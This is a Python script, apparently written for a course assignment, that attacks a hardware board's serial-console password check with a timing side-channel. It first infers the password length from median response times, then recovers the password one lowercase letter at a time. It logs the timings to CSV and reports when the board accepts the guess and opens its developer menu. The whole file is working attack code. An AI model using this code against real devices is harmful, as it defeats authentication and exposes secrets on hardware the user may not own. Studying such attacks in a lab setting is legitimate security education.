#!/usr/bin/env python3

import csv
import statistics
import time

import serial

PORT = "/dev/cu.usbserial-10"
BAUD_RATE = 115200
ALPHABET = "abcdefghijklmnopqrstuvwxyz"
MAX_LEN = 20          # the assignment caps the password at 20 lowercase letters
FILLER = "a"          # tail padding; a letter (the console stops reading at the
                      # first non-letter)
SAMPLES = 30
PROMPT = b"9: \r\n"   # the password prompt ends with this


def w(stream, data):
    stream.write((data + "\n").encode('utf-8'))


def r(stream, num_bytes=None, until=None):
    buffer = b''
    while True:
        if num_bytes is not None:
            remaining = num_bytes - len(buffer)
            if remaining <= 0:
                break
            if stream.in_waiting > 0:
                buffer += stream.read(min(stream.in_waiting, remaining))
            else:
                time.sleep(0.01)
        elif until is not None:
            if stream.in_waiting > 0:
                buffer += stream.read(stream.in_waiting)
                if until in buffer:
                    break
            else:
                time.sleep(0.01)
        else:
            if stream.in_waiting > 0:
                buffer += stream.read(stream.in_waiting)
            else:
                time.sleep(0.1)
                if stream.in_waiting == 0:
                    break
    return buffer


def drain(stream):
    while stream.in_waiting:
        stream.read(stream.in_waiting)
        time.sleep(0.02)


def probe(stream, guess):
    drain(stream)
    w(stream, guess)
    start = time.perf_counter()
    first = stream.read(1) # block until the board replies
    elapsed = (time.perf_counter() - start) * 1e3
    rest = r(stream, until=PROMPT) if first == b"L" else r(stream) # login fail or success
    return elapsed, first + rest


def accepted(reply):
    return b"Login failure" not in reply


def init(stream):
    time.sleep(2)
    probe(stream, "foo")
    if accepted(probe(stream, "z" * MAX_LEN)[1]):
        raise SystemExit("Board is not at the password prompt"
                         "(unplug/replug) and re-run.")


def infer_length(stream, writer):
    times = {length: [] for length in range(1, MAX_LEN + 1)}
    for rnd in range(SAMPLES):
        for length in times:
            dt, _ = probe(stream, FILLER * length)
            writer.writerow([length, rnd, f"{dt:.4f}"])
            times[length].append(dt)
    medians = {k: statistics.median(v) for k, v in times.items()}
    for length in sorted(medians):
        print(f"  len {length:2d}: {medians[length]:7.3f} ms")

    return max(medians, key=lambda L: medians[L]
               - (medians.get(L - 1, medians[L]) + medians.get(L + 1, medians[L])) / 2)


def recover(stream, length, writer):
    prefix = ""
    for pos in range(length):
        tail = FILLER * (length - pos - 1)
        times = {c: [] for c in ALPHABET}
        hit = None
        for rnd in range(SAMPLES):
            for c in ALPHABET:
                dt, reply = probe(stream, prefix + c + tail)
                writer.writerow([pos, c, rnd, f"{dt:.4f}"])
                times[c].append(dt)
                if accepted(reply):
                    hit = c
                    break
            if hit:
                break
        medians = {c: statistics.median(v) for c, v in times.items() if v}
        winner = hit or max(medians, key=medians.get)
        prefix += winner
        report(pos, winner, medians, by_login=bool(hit))
        if hit:
            return prefix, True
    return prefix, False


def report(pos, winner, medians, by_login):
    runners = sorted(((m, c) for c, m in medians.items() if c != winner),
                     reverse=True)[:3]
    others = ", ".join(f"'{c}' {m:.3f} ms ({int((1 - m / medians[winner]) * 100)}% faster)"
                       for m, c in runners)
    note = "  [accepted - login]" if by_login else ""
    print(f"  pos {pos + 1:2d}: '{winner}'  {medians[winner]:.3f} ms{note}  -> {winner!r}")
    print(f"           runners-up: {others}")


def main():
    with serial.Serial(PORT, BAUD_RATE, timeout=2) as stream:
        init(stream)
        with open("../timing-length.csv", "w", newline="") as lf, \
             open("../timing-chars.csv", "w", newline="") as cf:
            lw = csv.writer(lf)
            lw.writerow(["length", "sample", "elapsed_ms"])
            cw = csv.writer(cf)
            cw.writerow(["position", "candidate", "sample", "elapsed_ms"])

            print("inferring length...")
            length = infer_length(stream, lw)
            print(f"  -> length {length}")

            print("recovering password...")
            password, ok = recover(stream, length, cw)

    print(f"\npassword: {password}")
    print("confirmed: the board accepted it and showed the developer menu" if ok
          else "WARNING: no login seen - result unconfirmed")


if __name__ == "__main__":
    raise SystemExit(main())
